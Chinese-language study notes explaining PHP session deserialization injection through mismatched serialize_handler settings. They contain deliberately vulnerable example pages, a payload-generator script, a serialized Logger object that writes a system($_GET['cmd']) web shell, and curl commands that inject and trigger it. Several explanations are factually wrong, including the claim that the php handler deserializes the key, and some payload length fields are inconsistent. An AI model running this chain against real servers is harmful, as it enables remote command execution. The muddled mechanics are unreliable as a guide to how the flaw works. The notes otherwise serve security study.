这个漏洞的核心在于 **PHP 在序列化（serialize）和反序列化（unserialize）Session 数据时，如果使用了不同的处理器（handler），并且攻击者能够控制 Session 数据的内容，就可能触发对象注入，从而导致严重后果**。

### 1. 基础知识：PHP Session 的工作机制

1. **什么是 Session？**  
    Session 是一种在服务器端保持用户状态的机制。当用户第一次访问网站时，服务器会创建一个唯一的 Session ID（通常通过 Cookie `PHPSESSID` 传递给浏览器），并将用户的相关数据（如登录状态、购物车信息）保存在服务器端（如文件、数据库、内存中）。
    
2. **Session 的存储过程**  
    PHP 通过 `session.serialize_handler` 来定义序列化/反序列化 Session 数据时使用的处理器。常见的处理器有：
    
    - `php`：默认的处理器，使用键值对格式。
        
    - `php_binary`：一种二进制格式。
        
    - `php_serialize`：（PHP 5.5.4+引入）更强大，使用标准的 `serialize()` 函数格式。
        
3. **不同处理器的序列化格式**  
    假设我们有一个 `$_SESSION` 数组：
```php
$_SESSION['username'] = 'alice';
$_SESSION['role'] = 'user';

	php默认处理器格式：  
	    username|s:5:"alice";role|s:4:"user";
	    格式：键名|类型:长度:"值";
	        
	php_serialize 处理器格式：  
	    a:2:{s:8:"username";s:5:"alice";s:4:"role";s:4:"user";}
	    格式：直接使用 serialize($_SESSION) 的输出，整个 Session 数组被序列化。
```

### 2. 漏洞产生的原因

漏洞产生的关键在于：**PHP 在序列化（写入 Session 文件）和反序列化（读取 Session 文件）时，如果使用了不同的处理器，会对数据格式的解析产生差异。**

#### 经典攻击场景：`php_serialize` 写入 + `php` 读取

1. **配置差异**：
    
    - 应用 A（攻击入口点，如文件上传页面）的配置使用了 `php_serialize` 处理器（例如在 `.htaccess` 或 `ini_set` 中设置 `session.serialize_handler=php_serialize`）。
        
    - 应用 B（存在漏洞的核心逻辑，如包含某些类的页面）使用了默认的 `php` 处理器。
        
2. **攻击流程**：
    
    **步骤 1： 攻击者构造恶意序列化字符串**  
    假设网站上有一个存在漏洞的类 `MyClass`，其 `__destruct()` 或 `__wakeup()` 魔术方法中包含危险操作（如文件删除、命令执行）。
		
		class MyClass {
		    public $data;
		    function __destruct() {
		        // 危险操作！$data 可能被控制
		        system($this->data);
		    }
		}

		攻击者会创建一个 MyClass 对象的序列化字符串，其中 $data 被设置为要执行的命令：  
		O:7:"MyClass":1:{s:4:"data";s:10:"id";}
		
	**步骤 2： 将恶意数据注入到 Session 中**  
	PHP 允许通过 `session_start()` 之前的 HTTP 请求来设置 Session ID，最常见的方式是 **`Cookie: PHPSESSID=恶意字符串`**。
	但是，更直接的方式是利用 `php_serialize` 处理器的一个特性：它会忠实地反序列化通过 `$_SESSION` 超全局变量提交的数据。
	
	关键点在于，应用 A（使用 `php_serialize`）会收到这个数据，并将其作为 Session 数据的一部分进行序列化。由于 `php_serialize` 是序列化整个数组，最终写入 Session 文件（例如 `/tmp/sess_123`）的内容可能是：  
	`恶意序列化字符串|其它正常数据`

	**步骤 3： 触发反序列化**  
	当用户（携带同一个 `PHPSESSID=123`）访问应用 B 时，PHP 开始处理 Session。
	- 应用 B 使用 `php` 处理器来读取 Session 文件。
	- `php` 处理器看到的内容是：`恶意序列化字符串|其它正常数据`
	- 它开始解析：`php` 处理器以竖线 `|` 作为分隔符。它会将 `恶意序列化字符串` 解析为一个键（key），而 `其它正常数据` 会被解析为该键的值。
	- 然而，`php` 处理器在解析键（key）时，==会对其进行反序列化操作**！==
	  
	
	于是，`恶意序列化字符串` 被 `php` 处理器反序列化，这就导致了 `MyClass` 对象被创建。当请求处理完毕或脚本结束时，该对象的 `__destruct()` 方法会被自动调用，从而执行 `system('id')` 命令。

### 举例
### 场景设定

假设有一个简单的网站，包含两个文件：

1. **`upload.php`**： 文件上传页面，使用了 `php_serialize` 来处理 Session（可能因为某些历史原因或框架要求）。
    
2. **`index.php`**： 网站主页，使用了默认的 `php` Session 处理器。这个文件包含了一个用于日志记录的类 `Logger`，该类存在安全风险。

### 漏洞代码

**1. upload.php (使用 php_serialize)**
```php
<?php
// upload.php - 配置为使用 php_serialize
ini_set('session.serialize_handler', 'php_serialize');
session_start();

// 处理文件上传，并使用 session 记录上传进度
// 这里简化逻辑：直接将用户传入的 'data' 参数存入 session
if (isset($_POST['data'])) {
    $_SESSION['user_upload_data'] = $_POST['data'];
    echo "Data stored in session.";
}
?>
<form method="post">
    <input type="text" name="data" placeholder="Some upload data">
    <input type="submit" value="Upload">
</form>
```

**2. index.php (使用默认的 php)**
```php
<?php
// index.php - 使用默认的 php session handler
// 包含一个危险的类
class Logger {
    private $log_file;
    private $log_data;

    // 当对象被反序列化时自动调用
    public function __wakeup() {
        // 意图：将日志数据写入指定的文件
        // 危险！因为 $log_file 和 $log_data 可以被控制
        file_put_contents($this->log_file, $this->log_data, FILE_APPEND);
        echo "Log entry written. ";
    }
}

session_start(); // 这里使用 php 处理器读取 session 数据

// 正常的网站逻辑...
echo "Welcome to the homepage!";
?>
```

#### 攻击步骤与危害

**第1步：攻击者分析漏洞**

攻击者发现：

- `index.php` 包含了一个 `Logger` 类，该类在 `__wakeup()` 魔术方法中会执行 `file_put_contents($this->log_file, $this->log_data)`。
    
- 如果能够创建一个恶意的 `Logger` 对象并控制其 `$log_file` 和 `$log_data` 属性，就可以向服务器上的任意文件写入任意内容。
    
- `upload.php` 使用了不同的 Session 处理器 (`php_serialize`)，并且允许用户通过 `POST` 参数将数据存入 `$_SESSION`。
    

**第2步：构造恶意序列化字符串**

攻击者的目标是：在 web 根目录创建一个名为 `shell.php` 的文件，内容为 `<?php system($_GET['cmd']); ?>`，从而获得服务器命令执行权限。

他需要创建一个 `Logger` 对象的序列化字符串：

- `log_file` 属性设置为 `./shell.php`（相对于脚本执行目录，通常是 web 根目录）。
    
- `log_data` 属性设置为 `<?php system($_GET['cmd']); ?>`。
	
- 生成载荷的代码（`create_payload.php`）：

		<?php
		class Logger {
		    private $log_file = './shell.php';
		    private $log_data = '<?php system($_GET["cmd"]); ?>';
		}
		echo serialize(new Logger());
		?>
- 生成恶意payload
	`O:6:"Logger":2:{s:15:"Loggerlog_file";s:11:"./shell.php";s:15:"Loggerlog_data";s:29:"<?php system($_GET['cmd']); ?>";}`
	（注意：因为属性是 `private`，序列化后的字段名包含了类名前缀，格式为 `%00类名%00属性名`，这里显示为 `Loggerlog_file` 是简化表示，实际需要正确处理空字节 `%00`）。

**第3步：发动攻击**
攻击者向 `upload.php` 发送 POST 请求，将恶意载荷注入到 Session 中。
```bash
curl -X POST http://vulnerable-site.com/upload.php \
  -b "PHPSESSID=hackedsession" \
  -d "data=|O:6:\"Logger\":2:{s:15:\"\0Logger\0log_file\";s:11:\"./shell.php\";s:15:\"\0Logger\0log_data\";s:29:\"<?php system(\$_GET['cmd']); ?>\";}"
```
- **请注意开头的竖线 `|`**：这是攻击成功的关键。

- `upload.php` (`php_serialize`) 将整个 `$_SESSION` 数组序列化。它看到 `$_SESSION['user_upload_data'] = |恶意字符串`，最终写入 Session 文件（如 `/tmp/sess_hackedsession`）的内容会是：  
    `user_upload_data|s:长度:"|恶意字符串";`  
    但由于我们直接以 `|` 开头，简化理解，文件内容实质上是：`|恶意字符串`
**第4步：触发漏洞**

攻击者现在访问 `index.php`。
```bash
curl http://vulnerable-site.com/index.php -b "PHPSESSID=hackedsession"
```

这时会发生什么？

1. `index.php` 调用 `session_start()`。
    
2. PHP 使用 **`php`** 处理器去读取 `/tmp/sess_hackedsession` 文件的内容：`|恶意字符串`。
    
3. `php` 处理器的解析规则是 `键名|类型:长度:"值"`。它看到第一个字符是 `|`，因此它会认为：
    
    - **键名（key）** 是 `恶意字符串` 中第一个分号之前的部分？不，更准确地说，它会将 `|` 之前的内容作为键名。这里 `|` 是第一个字符，所以键名为**空**。
        
    - 但关键行为是：**`php` 处理器会尝试对这个“键名”进行反序列化！**
        
4. 于是，`php` 处理器开始对 `恶意字符串`（即我们构造的 `O:6:"Logger"...`）进行反序列化。
    
5. 反序列化成功，创建了一个 `Logger` 对象，其属性 `log_file` 和 `log_data` 被设置为攻击者控制的值。
    
6. 根据反序列化逻辑，对象的 `__wakeup()` 方法被自动调用。
    
7. `__wakeup()` 方法执行：`file_put_contents('./shell.php', '<?php system($_GET["cmd"]); ?>')`。
**第五步获取getshell**